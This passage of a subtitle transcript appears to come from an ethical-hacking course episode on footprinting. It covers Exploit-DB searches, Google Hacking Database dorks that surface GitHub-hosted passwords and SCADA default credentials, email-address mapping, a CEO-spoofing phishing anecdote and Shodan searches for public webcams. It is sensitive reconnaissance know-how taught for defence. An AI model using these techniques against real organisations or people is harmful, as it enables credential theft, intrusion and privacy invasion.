and\nattack one or more machines\n\n456\n00:21:49.970 --> 00:21:55.070\nif we wanted to be able to use this\nparticular exploit whatever it is.\n\n457\n00:21:55.070 --> 00:22:01.650\nWe can go back and\n\n458\n00:22:01.650 --> 00:22:05.699\nlet's do the following, go to under,\n\n459\n00:22:05.699 --> 00:22:10.153\nlet's see,\n\n460\n00:22:10.153 --> 00:22:16.150\ngo to Search off to the right there,\nup at the top.\n\n461\n00:22:16.150 --> 00:22:16.780\nJust click Search.\n\n462\n00:22:16.780 --> 00:22:17.810\nJust give it a second.\n\n463\n00:22:19.160 --> 00:22:23.970\nThere we go, and then there just\ngo ahead and type in a password.\n\n464\n00:22:23.970 --> 00:22:26.835\nWe're just gonna search for\nexploits around passwords, and\n\n465\n00:22:26.835 --> 00:22:29.650\nyou just have to hit Search and\ngive it a second to come back.\n\n466\n00:22:29.650 --> 00:22:31.140\nDid it find anything?\n\n467\n00:22:31.140 --> 00:22:32.550\n>> I've gotta tell it I'm not a robot.\n\n468\n00:22:32.550 --> 00:22:34.261\n>> Okay.\nYou didn't do the CAPTCHA, and\n\n469\n00:22:34.261 --> 00:22:35.137\nthen try it again.\n\n470\n00:22:39.450 --> 00:22:40.970\nThere we go.\n\n471\n00:22:40.970 --> 00:22:45.340\nYou should get some things that will list\npasswords or allow us to go look for\n\n472\n00:22:45.340 --> 00:22:48.480\npasswords or all sorts of stuff\nabout how to get passwords,\n\n473\n00:22:48.480 --> 00:22:50.380\na variety of different things.\n\n474\n00:22:50.380 --> 00:22:51.830\nYou can see there's all sorts of stuff.\n\n475\n00:22:51.830 --> 00:22:57.140\nThere's a reverse shell with TCP prompt,\npassword prompt.\n\n476\n00:22:57.140 --> 00:22:57.980\nI'm just looking.\n\n477\n00:22:59.320 --> 00:23:07.140\nHandy password, ACH overwrite exploit,\nLinux x86, something with password.\n\n478\n00:23:07.140 --> 00:23:09.700\nThere's all these different things that\nwill come up that can either be used to\n\n479\n00:23:09.700 --> 00:23:15.310\nexploit and or can actually be used just\nto go out and to find various things.\n\n480\n00:23:15.310 --> 00:23:22.792\nThere's also gonna be a bunch of different\n\n481\n00:23:22.792 --> 00:23:27.880\nitems that we can use simply\n\n482\n00:23:27.880 --> 00:23:32.390\nto find and I see there's like Apache\nlisted at the top, all that kind of stuff.\n\n483\n00:23:32.390 --> 00:23:33.600\nNow I see the page you're on.\n\n484\n00:23:33.600 --> 00:23:35.372\nI'm just doing it in real\ntime while we're talking.\n\n485\n00:23:35.372 --> 00:23:37.030\n>> [LAUGH]\n>> But we also can go in,\n\n486\n00:23:37.030 --> 00:23:39.920\nlet me give you the URL\nspecifically I want you to go to.\n\n487\n00:23:39.920 --> 00:23:43.230\nGo to Google Hacking Database up on\nthe top there, off to the right.\n\n488\n00:23:43.230 --> 00:23:44.610\nOff to the right, yeah, right there.\n\n489\n00:23:44.610 --> 00:23:46.100\nClick on that one.\n\n490\n00:23:46.100 --> 00:23:49.386\nWhen you go there-\n>> I like these.\n\n491\n00:23:49.386 --> 00:23:50.999\nWe will get all the password strings, or\n\n492\n00:23:50.999 --> 00:23:53.390\nall the various strings\nthat you can go and put in.\n\n493\n00:23:53.390 --> 00:23:56.273\nSo let's do the very first\none should be site Githubs.\n\n494\n00:23:56.273 --> 00:23:57.731\n>> Uh-huh\n>> Something, something user name example\n\n495\n00:23:57.731 --> 00:23:58.690\npassword, right?\n\n496\n00:23:58.690 --> 00:24:00.118\nClick on that one and\n\n497\n00:24:00.118 --> 00:24:05.242\nwhen you click on that one what you're\ngonna get is [SOUND] it'll open up.\n\n498\n00:24:05.242 --> 00:24:08.102\nAnd essentially as the people\ncould see it'll open up and\n\n499\n00:24:08.102 --> 00:24:11.250\ndescribe the google dork it'll\nessentially tell you what it is.\n\n500\n00:24:11.250 --> 00:24:15.470\nIt will give you the Google search string\nand then whoever submitted it etc.\n\n501\n00:24:15.470 --> 00:24:18.680\nSo if you've click on the search string,\nclick on that.\n\n502\n00:24:18.680 --> 00:24:20.810\nIt's gonna take us out to Google, right?\n\n503\n00:24:20.810 --> 00:24:25.580\nAnd what it's gonna do is launch the\nstring into the Google search browser and\n\n504\n00:24:25.580 --> 00:24:28.020\nit's gonna allow you then to\nsee all the results, right?\n\n505\n00:24:28.020 --> 00:24:32.340\nAnd essentially what we've done is create\nan advanced search string in Google and\n\n506\n00:24:32.340 --> 00:24:34.040\nusing advanced parameters.\n\n507\n00:24:34.040 --> 00:24:36.030\nWe've searched that string of code.\n\n508\n00:24:36.030 --> 00:24:38.720\nAnd then we've got what,\nabout 2,000 results there.\n\n509\n00:24:38.720 --> 00:24:42.560\nAnd click on, for instance,\nthe very first link right there,\n\n510\n00:24:42.560 --> 00:24:45.400\nthe GitHub link, and look at what we get.\n\n511\n00:24:45.400 --> 00:24:48.270\nWe get a list of usernames and passwords,\n>> [LAUGH]\n\n512\n00:24:48.270 --> 00:24:50.040\n>> That are available on that website.\n\n513\n00:24:50.040 --> 00:24:53.180\nIt looked like, I looked at it earlier,\nlooks like it's some sort of demo test\n\n514\n00:24:53.180 --> 00:24:55.900\nsite, where they got a bunch\nof user accounts set up.\n\n515\n00:24:55.900 --> 00:24:58.360\nBut, you can go through and\n\n516\n00:24:58.360 --> 00:25:03.330\nanything that is on GitHub that has these\nuser names and passwords will show up.\n\n517\n00:25:03.330 --> 00:25:08.220\nSo, if you go back to the main list and\ngo, one, two, three,\n\n518\n00:25:08.220 --> 00:25:11.865\nfour, five down,\nthere is something that says SCADAPASS.\n\n519\n00:25:11.865 --> 00:25:13.720\n>> Mm-hm.\n>> All right, click on that one.\n\n520\n00:25:13.720 --> 00:25:18.310\nAnd so, what we'll see there Is again,\nthis is specifically\n\n521\n00:25:18.310 --> 00:25:23.090\ndesigned to look at files that\nare on a GitHub fork or GitHub site.\n\n522\n00:25:23.090 --> 00:25:27.470\nBut, what we'll see is a hard-coded\npassword list for SCADA.\n\n523\n00:25:27.470 --> 00:25:31.650\nAnd we'll see some information about,\nin this case,\n\n524\n00:25:31.650 --> 00:25:34.900\nwho the vendor is, information about them.\n\n525\n00:25:34.900 --> 00:25:37.320\nLooks like a bunch of\ndifferent vendors and\n\n526\n00:25:37.320 --> 00:25:39.970\nperhaps passwords associated with them.\n\n527\n00:25:39.970 --> 00:25:42.060\nThese are the default passwords or\n\n528\n00:25:42.060 --> 00:25:46.210\ninformation items about these products for\nSCADA systems.\n\n529\n00:25:46.210 --> 00:25:47.740\n>> Right.\n>> Right, so this is the kind of stuff\n\n530\n00:25:47.740 --> 00:25:51.960\nthat, as a hacker,\nis just great because we can go in, and\n\n531\n00:25:51.960 --> 00:25:54.090\nwe can pull this stuff down easily.\n\n532\n00:25:54.090 --> 00:25:56.310\nIt's like a super bargain for hackers and\n\n533\n00:25:56.310 --> 00:25:59.300\nwe can find what we want\nto attack a system.\n\n534\n00:25:59.300 --> 00:26:02.520\nCross reference this with going in and\ndoing a search for\n\n535\n00:26:02.520 --> 00:26:07.040\nweb exploits against IAS version 8 that\nwe pulled up on Netcraft for a website.\n\n536\n00:26:07.040 --> 00:26:11.290\nAnd we've got ten different attacks, or\nwho knows how many, readily available for\n\n537\n00:26:11.290 --> 00:26:12.320\nus to exploit.\n\n538\n00:26:12.320 --> 00:26:15.870\nAs a ethical hacker, right,\nwe're finding the same information.\n\n539\n00:26:15.870 --> 00:26:19.070\nBut now we're finding weaknesses that we\nmay have to go out and actually identify.\n\n540\n00:26:19.070 --> 00:26:22.330\nAnd therefore ultimately deal with so\nwe can prevent from being attacked.\n\n541\n00:26:22.330 --> 00:26:24.160\n>> Yeah.\nIt always amazes me how much\n\n542\n00:26:24.160 --> 00:26:25.170\ninformation you can find.\n\n543\n00:26:25.170 --> 00:26:29.000\nEven in this day and\nage when people really should know better,\n\n544\n00:26:29.000 --> 00:26:31.090\nhow much information people\nput on their websites.\n\n545\n00:26:31.090 --> 00:26:35.360\nIf they don't put a link to\nthat page on their website,\n\n546\n00:26:35.360 --> 00:26:38.220\nthey feel like it's safe and\nnobody is gonna get to it.\n\n547\n00:26:38.220 --> 00:26:40.730\nThose web engines,\nthey spider all of that stuff.\n\n548\n00:26:40.730 --> 00:26:43.940\nAnd with these Google Hack,\nyou can do search for log in pages, for\n\n549\n00:26:43.940 --> 00:26:45.180\npasswords, for.\n\n550\n00:26:45.180 --> 00:26:46.940\nAnd people will have a list\nof their usernames and\n\n551\n00:26:46.940 --> 00:26:48.400\npasswords that they store on a website.\n\n552\n00:26:48.400 --> 00:26:51.110\nSo that they can get to it quickly and\neasily and\n\n553\n00:26:51.110 --> 00:26:53.960\ndon't think anybody else can get to it.\n\n554\n00:26:53.960 --> 00:26:55.220\n>> Absolutely.\n\n555\n00:26:55.220 --> 00:26:58.500\nSo it's scary one respect.\n\n556\n00:26:58.500 --> 00:27:02.490\nBecause the web has really enabled\nus to be able to go out and\n\n557\n00:27:02.490 --> 00:27:05.090\nto find so much stuff.\n\n558\n00:27:05.090 --> 00:27:09.660\nAnd find so many things that normally\nare not available as Mike was saying.\n\n559\n00:27:09.660 --> 00:27:10.860\nWe may not see them.\n\n560\n00:27:10.860 --> 00:27:13.080\nMay not know they're there,\nhide in plain sight.\n\n561\n00:27:13.080 --> 00:27:16.360\nBut, the reality is that I showed\nyou this in the episode we did\n\n562\n00:27:16.360 --> 00:27:19.320\nwith the demonstrations\nassociated with footprinting and\n\n563\n00:27:19.320 --> 00:27:23.020\nrecon where we went in, and\nwe used the HDT track right?\n\n564\n00:27:23.020 --> 00:27:24.210\nTo be able to mirror the website.\n\n565\n00:27:24.210 --> 00:27:28.990\nPull it down and we mirrored part of\nCNN.com and we brought it down and\n\n566\n00:27:28.990 --> 00:27:31.330\nwe're able to spider through and\nlook at all the legs.\n\n567\n00:27:31.330 --> 00:27:34.290\nYou were copying everything even\nthe stuff that you're not suppose to see\n\n568\n00:27:34.290 --> 00:27:36.550\nbecause the code just goes and\nthen grabs it all.\n\n569\n00:27:36.550 --> 00:27:40.750\nSo that's something we have to be aware of\nthat we really have to think about because\n\n570\n00:27:40.750 --> 00:27:43.550\nagain, we may not realize it's there.\n\n571\n00:27:43.550 --> 00:27:46.800\nPeople may not see it, but\nthe reality is, it is there.\n\n572\n00:27:46.800 --> 00:27:48.900\nRight?\nAnd we do have to be aware of that.\n\n573\n00:27:48.900 --> 00:27:52.320\nSo, we got a quesiton in the chat window,\nwhich was about,\n\n574\n00:27:52.320 --> 00:27:57.100\nwhen we were in doing the Google database,\nthe Google Hacking Data Base, the GHDB.\n\n575\n00:27:57.100 --> 00:27:59.530\nWhat's the difference between just\nthe Google Hacking Data Base and\n\n576\n00:27:59.530 --> 00:28:01.480\nthe Offensive Security GHDB?\n\n577\n00:28:01.480 --> 00:28:05.620\nOffensive security is just the entity\nthat is connecting through the community\n\n578\n00:28:05.620 --> 00:28:07.910\nproject to host the GHDB.\n\n579\n00:28:07.910 --> 00:28:08.840\nIt’s not that its different,\n\n580\n00:28:08.840 --> 00:28:11.720\nit’s just the front end of the site\nthat is actually hosting it.\n\n581\n00:28:11.720 --> 00:28:16.110\nThis originally was created by an\nindividual, the Google Hacking Database.\n\n582\n00:28:17.230 --> 00:28:21.610\nAnd then eventually became kind of\na community charity project where\n\n583\n00:28:21.610 --> 00:28:24.890\npeople post stuff to create\na better sense of security and\n\n584\n00:28:24.890 --> 00:28:27.130\nto provide a window into what's going on.\n\n585\n00:28:27.130 --> 00:28:30.090\nSo we can become better at\ndefending against this stuff and\n\n586\n00:28:30.090 --> 00:28:32.190\nit's maintained as\na community project now.\n\n587\n00:28:32.190 --> 00:28:35.110\nAnd so a fence of security\nhas just got that front\n\n588\n00:28:35.110 --> 00:28:37.210\nend where they are hosting links to it,\nand\n\n589\n00:28:37.210 --> 00:28:40.600\nthey're just a company that happens to\nlink to it and provide access to it.\n\n590\n00:28:40.600 --> 00:28:41.580\nSo there's no difference.\n\n591\n00:28:41.580 --> 00:28:42.810\nIt's the same database,\n\n592\n00:28:42.810 --> 00:28:44.862\nit's just that we chose to get\nthrough it through their site.\n\n593\n00:28:44.862 --> 00:28:48.035\nThat's the It's the only\nreason you saw the offensive\n\n594\n00:28:48.035 --> 00:28:50.255\nsecurity icon in the upper\nleft there I think.\n\n595\n00:28:50.255 --> 00:28:51.945\n>> What was it originally, Johnny?\n\n596\n00:28:51.945 --> 00:28:53.105\n>> Johnny I Hack Stuff?\n\n597\n00:28:53.105 --> 00:28:56.345\n>> Johnny I hack Stuff, right, and then he\nkind of went off and discovered religion\n\n598\n00:28:56.345 --> 00:28:58.150\nand is doing, which is great, he's-\n>> Uh-huh\n\n599\n00:28:58.150 --> 00:28:59.400\n>> Doing a lot of really good\n\n600\n00:28:59.400 --> 00:29:01.530\ncharity work, doing a lot of great things.\n\n601\n00:29:01.530 --> 00:29:05.372\nAnd he's kind the turn it over to\nthe community to maintain and so\n\n602\n00:29:05.372 --> 00:29:09.852\nit's out there now people can access it,\nbut he kind of get out of that whole\n\n603\n00:29:09.852 --> 00:29:13.582\n[CROSSTALK] this kind of thing and\nhe's doing other stuff now.\n\n604\n00:29:13.582 --> 00:29:14.139\nAll right,\n\n605\n00:29:14.139 --> 00:29:17.940\nthat's the google hacking database as\nwe think about the methodology, right.\n\n606\n00:29:17.940 --> 00:29:22.260\nfootprinting through search engines as\nyou can see can be incredibly powerful.\n\n607\n00:29:22.260 --> 00:29:25.150\nStep number two footprinting through\nadvanced Google hacking techniques,\n\n608\n00:29:25.150 --> 00:29:27.830\nwe've shown you some of that with\nthe Google advanced search and\n\n609\n00:29:27.830 --> 00:29:30.350\nsome of the ways in which we\ncan leverage other areas.\n\n610\n00:29:30.350 --> 00:29:33.360\nStep number three footprinting\nthrough social networking sites,\n\n611\n00:29:33.360 --> 00:29:36.430\nwe've shown you some of that with LinkedIn\nand talked about the value there.\n\n612\n00:29:36.430 --> 00:29:39.000\nWe've talked about website\nfootprinting and we've gone in and\n\n613\n00:29:39.000 --> 00:29:41.290\nshown you how to do some of that.\n\n614\n00:29:41.290 --> 00:29:41.820\nWe, I think,\n\n615\n00:29:41.820 --> 00:29:45.600\ntook the Wayback Machine to one of our\nprior episodes which showed you Netcraft.\n\n616\n00:29:45.600 --> 00:29:49.710\nSo we could do web site footprinting\npretty easily by looking at the website,\n\n617\n00:29:49.710 --> 00:29:51.080\nlooking at the underlying code.\n\n618\n00:29:51.080 --> 00:29:54.830\nI showed you in the episode we\ndid with the demonstrations.\n\n619\n00:29:54.830 --> 00:29:57.660\nWe looked at a plug-in for\nFirefox called Firebug,\n\n620\n00:29:57.660 --> 00:30:01.895\nand we looked at profiling the code, be\nanother way to do web site footprinting.\n\n621\n00:30:01.895 --> 00:30:05.080\n>> E-mail footprinting would be\nthe fifth step in the process.\n\n622\n00:30:05.080 --> 00:30:07.570\nWe look at all the different aspects,\nall the different areas, right?\n\n623\n00:30:07.570 --> 00:30:10.200\nGoing in, can we get e-mail information?\n\n624\n00:30:10.200 --> 00:30:11.840\nCan we look at host editors?\n\n625\n00:30:11.840 --> 00:30:13.240\nWhat can we find?\n\n626\n00:30:13.240 --> 00:30:16.410\nWhat may be able to be discoverable there?\n\n627\n00:30:16.410 --> 00:30:17.920\nI think I may have shared with you,\n\n628\n00:30:17.920 --> 00:30:22.550\nin the very first episodes we did,\nthe story that one of my customers who\n\n629\n00:30:22.550 --> 00:30:27.590\nbasically had a hacker send in a fake\nemail purporting to be a from the CEO.\n\n630\n00:30:27.590 --> 00:30:33.210\nAsked for the HR function or rerelease of\nthe W2 and W9 information, and had it all\n\n631\n00:30:33.210 --> 00:30:37.700\nsent and essentially gave away everybody's\nidentity right and all that information.\n\n632\n00:30:37.700 --> 00:30:41.890\nSo email, footprinting what kind of\nemail systems are there What can we do?\n\n633\n00:30:41.890 --> 00:30:43.470\nCan we remotely, through a console,\n\n634\n00:30:43.470 --> 00:30:48.980\nlog in, use extended SMTP tools\nto be able to get in and connect?\n\n635\n00:30:48.980 --> 00:30:51.650\nDo we know the email format for\nthe company?\n\n636\n00:30:51.650 --> 00:30:53.540\nEasy enough typically to find.\n\n637\n00:30:53.540 --> 00:30:57.030\nYou go to a website, they usually have\nan info ad or something like that.\n\n638\n00:30:57.030 --> 00:31:00.150\nYou may even see the name of somebody\nthat's white cross referencing this\n\n639\n00:31:00.150 --> 00:31:04.210\ninformation with DNS name registration\ninformation is usually valuable.\n\n640\n00:31:04.210 --> 00:31:07.550\nBecause normally they will have the name\nof the person registered as the company\n\n641\n00:31:07.550 --> 00:31:09.460\nrep and they'll have their email address.\n\n642\n00:31:09.460 --> 00:31:15.040\nSo you could see it's\nMikeroderick@company.y or\n\n643\n00:31:15.040 --> 00:31:18.320\nsomething like that, or it's a.g123.\n\n644\n00:31:18.320 --> 00:31:22.370\nSo first initial, last initial,\nnumerical sequence @companyname.\n\n645\n00:31:22.370 --> 00:31:24.540\nBut you're gonna find that information.\n\n646\n00:31:24.540 --> 00:31:26.560\nYou go to LinkedIn and find the emails.\n\n647\n00:31:26.560 --> 00:31:29.510\nYou go to websites,\nfind people's e-mails on social media,\n\n648\n00:31:29.510 --> 00:31:32.220\ncross reference three or\nfour touch points.\n\n649\n00:31:32.220 --> 00:31:35.936\nAnd all of a sudden you now know in theory\nhow to e-mail anybody at that company.\n\n650\n00:31:35.936 --> 00:31:40.031\nNow all you need to do is start probing\nto find who answers those e-mails, and\n\n651\n00:31:40.031 --> 00:31:42.992\nyou've got a map of all the people\nthat are active in that\n\n652\n00:31:42.992 --> 00:31:45.710\ncompany starting to lay\nout that information.\n\n653\n00:31:45.710 --> 00:31:46.843\nIt's not hard to do.\n\n654\n00:31:46.843 --> 00:31:51.075\nWe want to look at step six for\ncompetitive intelligence, right.\n\n655\n00:31:51.075 --> 00:31:52.796\nWanna go out and you search the company.\n\n656\n00:31:52.796 --> 00:31:54.120\nWhat do we find out there?\n\n657\n00:31:54.120 --> 00:31:55.370\nWho were their competitors?\n\n658\n00:31:55.370 --> 00:31:57.100\nWhat vertical do they operate in?\n\n659\n00:31:57.100 --> 00:31:59.120\nWhat information can I glean about them?\n\n660\n00:31:59.120 --> 00:32:02.060\nAre they a publicly traded company\non a stock exchange somewhere in\n\n661\n00:32:02.060 --> 00:32:03.040\nthe world, if they are.\n\n662\n00:32:03.040 --> 00:32:05.500\nThere's gotta be financial\nreporting out there about them.\n\n663\n00:32:05.500 --> 00:32:08.120\nThere's some sort of prospectus\nthey put out every year.\n\n664\n00:32:08.120 --> 00:32:10.060\nThere's investor information.\n\n665\n00:32:10.060 --> 00:32:13.284\nToday, there's probably complaints\nabout them all over the web, and\n\n666\n00:32:13.284 --> 00:32:15.124\ngood things about them all over the web.\n\n667\n00:32:15.124 --> 00:32:17.987\nSo we're gonna take a look at that.\n\n668\n00:32:17.987 --> 00:32:20.682\nYeah, we're gonna look\nat Shodan IO as well.\n\n669\n00:32:20.682 --> 00:32:23.274\nWe'll show you the Shodan browser\nin just a couple of minutes and\n\n670\n00:32:23.274 --> 00:32:24.570\nshow you what we can find there.\n\n671\n00:32:24.570 --> 00:32:27.165\nBut there's all these different\nways in which we can do this.\n\n672\n00:32:27.165 --> 00:32:30.050\nWe talked in step seven about\ndoing who is footprinting?\n\n673\n00:32:30.050 --> 00:32:32.505\nWe've taken a look at that already,\nseen how that would work.\n\n674\n00:32:32.505 --> 00:32:34.998\nIn step eight,\nwe talked about DNS footprinting and\n\n675\n00:32:34.998 --> 00:32:37.047\nwe've taken a look at that with NSLookup.\n\n676\n00:32:37.047 --> 00:32:41.312\nAnd looking at the ability to be able to\ndo zone transfers and talk about the value\n\n677\n00:32:41.312 --> 00:32:44.900\nof finding those resource records and\nwhat we can glean from them.\n\n678\n00:32:44.900 --> 00:32:46.940\nWe've talked about network foot\nprinting in step nine, and\n\n679\n00:32:46.940 --> 00:32:47.945\nhow we can probe the network.\n\n680\n00:32:47.945 --> 00:32:51.030\nAnd we're gonna do some more\ndemonstrations and show you some of that.\n\n681\n00:32:51.030 --> 00:32:51.980\nThe Shodan browser,\n\n682\n00:32:51.980 --> 00:32:54.540\nwhich we'll take a look at here in\na minute will be very helpful for that.\n\n683\n00:32:54.540 --> 00:32:57.225\nAnd then footprinting thru\nsocial engineering is step ten.\n\n684\n00:32:57.225 --> 00:32:59.320\nWe've talked about some of\nthe ways we could do that.\n\n685\n00:32:59.320 --> 00:33:03.330\nWe could trick someone as that was the\nstory I shared with you about my client.\n\n686\n00:33:03.330 --> 00:33:05.930\nThat they could be tricked into\nproviding this information.\n\n687\n00:33:05.930 --> 00:33:08.230\nThe email looked like\nit came from the CEO.\n\n688\n00:33:08.230 --> 00:33:10.000\nPretty authoritative in that respect and\n\n689\n00:33:10.000 --> 00:33:13.210\nobviously, who's gonna\nchallenge a CEO of the company?\n\n690\n00:33:13.210 --> 00:33:15.315\nWell the anser is everybody should.\n\n691\n00:33:15.315 --> 00:33:18.985\nBecause just because they email in,\ndoesn't mean it's them.\n\n692\n00:33:18.985 --> 00:33:22.186\nAnd as I pointed out when I told\nthe story, the downfall here,\n\n693\n00:33:22.186 --> 00:33:26.006\nwas that there was no policy that was\nclearly communicated to everybody in\n\n694\n00:33:26.006 --> 00:33:27.189\ntheir organization.\n\n695\n00:33:27.189 --> 00:33:30.464\nThat made them understand that they\nwould never see an email like this\n\n696\n00:33:30.464 --> 00:33:32.610\nwithout an additional\nfollow up phone call or\n\n697\n00:33:32.610 --> 00:33:35.387\nsome sort of additional\nidentifier being attached to it.\n\n698\n00:33:35.387 --> 00:33:37.256\nAnd that just an email in and of itself,\n\n699\n00:33:37.256 --> 00:33:40.470\nit's not a reason to release\nthis confidential information.\n\n700\n00:33:40.470 --> 00:33:43.005\nQuite the opposite, it is a reason\nto set off an alarm bell and say,\n\n701\n00:33:43.005 --> 00:33:44.198\nthat something's not right.\n\n702\n00:33:44.198 --> 00:33:48.533\nBecause we would never request this\ninformation via email without additional\n\n703\n00:33:48.533 --> 00:33:51.103\ndiscussions and additional documentation.\n\n704\n00:33:51.103 --> 00:33:55.872\nIf you do any banking in the United States\nor in even most places in the world today,\n\n705\n00:33:55.872 --> 00:33:59.290\nyou will find from the major\nbanks that you deal with.\n\n706\n00:33:59.290 --> 00:34:02.383\nI'm talking about you're\nthe mega banks of the world.\n\n707\n00:34:02.383 --> 00:34:06.756\nAnd if you own a credit card from a major\ncredit card company, you'll find that both\n\n708\n00:34:06.756 --> 00:34:10.380\nof them will make it uncritical to\nyou when you sign up for service that\n\n709\n00:34:10.380 --> 00:34:14.649\nthey will never ask you to submit account\ninformation via email to a blind alias.\n\n710\n00:34:14.649 --> 00:34:17.822\nThey make it clear in their service\nterms that they will follow up\n\n711\n00:34:17.822 --> 00:34:19.776\nwith you specifically over the phone.\n\n712\n00:34:19.776 --> 00:34:22.907\nAnd while they may send you an email\nasking you to contact them,\n\n713\n00:34:22.907 --> 00:34:26.630\nthat email will never say, please\nsubmit your username, your password,\n\n714\n00:34:26.630 --> 00:34:28.970\nyour account number for verification.\n\n715\n00:34:28.970 --> 00:34:32.850\nThat is not done, because they understand\nhow easy it is to spoof that email and\n\n716\n00:34:32.850 --> 00:34:34.510\nto make it appear that it's real.\n\n717\n00:34:34.510 --> 00:34:37.360\nHow hard is it to do a Google search and\nfind a logo?\n\n718\n00:34:37.360 --> 00:34:40.396\nHow hard is it to make\na legitimate copy of an email and\n\n719\n00:34:40.396 --> 00:34:44.605\nthen just put your bad information\ninto it and recycle that email frame.\n\n720\n00:34:44.605 --> 00:34:48.685\nAnd make it look like it came from\nAmerican Express with all the logos and\n\n721\n00:34:48.685 --> 00:34:51.337\nthe contact info in the email and\neverything.\n\n722\n00:34:51.337 --> 00:34:54.973\nBut instead when you click on that link\nthat link actually goes off into space and\n\n723\n00:34:54.973 --> 00:34:56.111\nit goes to a hacker site,\n\n724\n00:34:56.111 --> 00:34:59.276\nwhere they're gonna strip your\ncredentials when you provide them.\n\n725\n00:34:59.276 --> 00:35:01.610\nNot hard to do at all\ntoday as a matter of fact.\n\n726\n00:35:01.610 --> 00:35:03.910\nLet's go and\nlet's take a look at the Shodan browser,\n\n727\n00:35:03.910 --> 00:35:05.270\nI know we had that one up as well.\n\n728\n00:35:05.270 --> 00:35:07.916\nWanted to show that and\nshow you what you can do here.\n\n729\n00:35:07.916 --> 00:35:11.189\nSo Shodan is a very interesting\nbrowser which Shodan does,\n\n730\n00:35:11.189 --> 00:35:14.207\nbeen around for probably about four or\nfive years now.\n\n731\n00:35:14.207 --> 00:35:18.138\nIt is the browser for\nthe Internet of everything as they say,\n\n732\n00:35:18.138 --> 00:35:21.180\nessentially anything can be looked at.\n\n733\n00:35:21.180 --> 00:35:24.304\nAnd you can go in, and\nwhat we did is we went to the main page.\n\n734\n00:35:24.304 --> 00:35:28.482\nAnd then all we did is I had my click\non the link that allows us to view all\n\n735\n00:35:28.482 --> 00:35:32.878\nwhich is a little gray link up at the top,\nunderneath the nab bar up, up,\n\n736\n00:35:32.878 --> 00:35:34.561\nup right there over right.\n\n737\n00:35:34.561 --> 00:35:37.249\nI haven't just click there you\nmay not even see it, cuz it's so\n\n738\n00:35:37.249 --> 00:35:40.419\nhard to see it's like get kinda have\njust there hiding on the background.\n\n739\n00:35:40.419 --> 00:35:43.899\nBut when you click on that it gives you\na link to all the different areas of\n\n740\n00:35:43.899 --> 00:35:44.657\nthe browsers.\n\n741\n00:35:44.657 --> 00:35:47.996\nNow you can go to the exploit's box and\nyou don't have to click on,\n\n742\n00:35:47.996 --> 00:35:49.195\nbut just highlight it.\n\n743\n00:35:49.195 --> 00:35:50.507\nIf read what it says there,\n\n744\n00:35:50.507 --> 00:35:53.657\nit lets you search multiple\nexploit databases simultaneously.\n\n745\n00:35:53.657 --> 00:35:57.605\nSo this will let you search the Google\nhacking database, a bunch of other\n\n746\n00:35:57.605 --> 00:36:02.087\ndatabases that exist that we haven't\ntalked about, and pull up exploits there.\n\n747\n00:36:02.087 --> 00:36:05.102\nWe can go out and search for\nimages, search for maps,\n\n748\n00:36:05.102 --> 00:36:07.240\nuse the Shodan browser itself.\n\n749\n00:36:07.240 --> 00:36:11.230\nNow the browser requires an account for\nyou to do anything specific and\n\n750\n00:36:11.230 --> 00:36:14.970\nyou have to pay money to be able to\nget access to all of the results.\n\n751\n00:36:14.970 --> 00:36:17.993\nThe browser's really used\nprimarily by law enforcement,\n\n752\n00:36:17.993 --> 00:36:21.505\ngovernment entities, that are looking\nto search for information.\n\n753\n00:36:21.505 --> 00:36:24.280\nBut it's available to the public,\nyou just have to pay for it.\n\n754\n00:36:24.280 --> 00:36:26.604\nBut let's just go to the Shodan tile\nthere, let's go back to the main page.\n\n755\n00:36:26.604 --> 00:36:27.883\n>> Here?\n\n756\n00:36:27.883 --> 00:36:29.235\n>> Yeah, go back to the main page.\n\n757\n00:36:29.235 --> 00:36:33.551\nAnd up there under search up at the top,\nyou'll see that you can search for\n\n758\n00:36:33.551 --> 00:36:34.940\nall sorts of stuff.\n\n759\n00:36:34.940 --> 00:36:37.561\nWebcams, buildings, you name it.\n\n760\n00:36:37.561 --> 00:36:41.648\nIf we go back to view all, so go back to\nthe view all link where we just were.\n\n761\n00:36:41.648 --> 00:36:44.656\nAnd search for I think there's one for\n\n762\n00:36:44.656 --> 00:36:49.733\nwebcams down there towards\nthe middle to the bottom somewhere.\n\n763\n00:36:49.733 --> 00:36:53.250\nWebcam map or something, if you look at\nall the titles in the boxes there's one.\n\n764\n00:36:53.250 --> 00:36:54.036\nI just can't see it.\n>> Webcam Browser?\n\n765\n00:36:54.036 --> 00:36:54.997\n>> Yeah, that's the one,\nI just can't see it.\n\n766\n00:36:54.997 --> 00:36:55.876\n>> Nope.\n\n767\n00:36:55.876 --> 00:36:57.068\n>> It may not be working right now.\n\n768\n00:36:57.068 --> 00:37:01.389\nWe saw that there was something there on\nthe chat that said, it may have been down.\n\n769\n00:37:01.389 --> 00:37:04.702\nI think we already have the page loaded so\nmay have been cached, but\n\n770\n00:37:04.702 --> 00:37:06.310\nit may not be working right now.\n\n771\n00:37:06.310 --> 00:37:09.303\nBut you will be able to get out and\nsearch there, you can search for\n\n772\n00:37:09.303 --> 00:37:10.235\nall sorts of stuff.\n\n773\n00:37:10.235 --> 00:37:14.241\nThey have a honey pot or honey net\nidentifier there where you can search for\n\n774\n00:37:14.241 --> 00:37:15.430\nhoney pots.\n\n775\n00:37:15.430 --> 00:37:17.025\nIs it a honey pot, yes or no?\n\n776\n00:37:17.025 --> 00:37:20.170\nSo you'll actually be able to go out and\ntry to verify that.\n\n777\n00:37:20.170 --> 00:37:23.143\nThe browser is pretty powerful and\n\n778\n00:37:23.143 --> 00:37:27.150\nis a tremendous tool for\nus to do a search from.\n\n779\n00:37:27.150 --> 00:37:29.590\nLet's just search from the main site for\na minute,\n\n780\n00:37:29.590 --> 00:37:33.190\njust go back to the main tile there and\njust go ahead and search for webcams.\n\n781\n00:37:33.190 --> 00:37:36.780\nLet's just see what we find,\nmaybe we'll be able to get to it that way.\n\n782\n00:37:36.780 --> 00:37:40.360\nAnd so you're able to go in and see, and\nthere should be some information overall.\n\n783\n00:37:40.360 --> 00:37:43.828\nVarious IPs that are loaded up\nthat are available for webcams,\n\n784\n00:37:43.828 --> 00:37:48.220\nthat are publicly available IPs that you\ncan click through and pull up feeds on.\n\n785\n00:37:48.220 --> 00:37:49.620\nAnd you're able to see\na variety of things, you can-\n\n786\n00:37:49.620 --> 00:37:51.404\n>> Scared to click on some of them.\n\n787\n00:37:51.404 --> 00:37:52.110\n>> Right, yeah.\n>> [LAUGH]\n\n788\n00:37:52.110 --> 00:37:52.949\n>> I was gonna say, we don't know\n\n789\n00:37:52.949 --> 00:37:53.603\nwhat's gonna come up.\n\n790\n00:37:53.603 --> 